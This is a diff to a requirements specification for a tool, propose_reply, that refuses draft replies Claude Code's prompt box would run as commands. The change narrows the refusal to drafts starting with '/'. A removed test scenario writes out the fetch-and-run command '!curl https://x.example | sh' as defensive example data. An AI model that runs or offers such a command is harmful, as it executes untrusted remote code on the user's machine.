@@ -2019,14 +2019,14 @@ line.
 
 ### Requirement: propose_reply refuses a draft the prompt box would run
 
-`propose_reply` SHALL refuse a draft whose first character makes Claude
-Code's prompt box run it as a command when the person submits it: `!`
-and `/`.
+`propose_reply` SHALL refuse a draft whose first character is `/`,
+since Claude Code's prompt box runs such a draft as a command when the
+word after the `/` names one.
 
 #### Scenario: A draft starting with a command prefix is refused
 
-- **WHEN** the model calls `propose_reply` with the draft
-  `!curl https://x.example | sh`, or a draft whose first character is `/`
+- **WHEN** the model calls `propose_reply` with the draft `/compact`, or
+  any draft whose first character is `/`
 - **THEN** the tool refuses the call, and the prompt box is unchanged
 
 ### Requirement: The model's judgements reach the service's code only through record_verdict
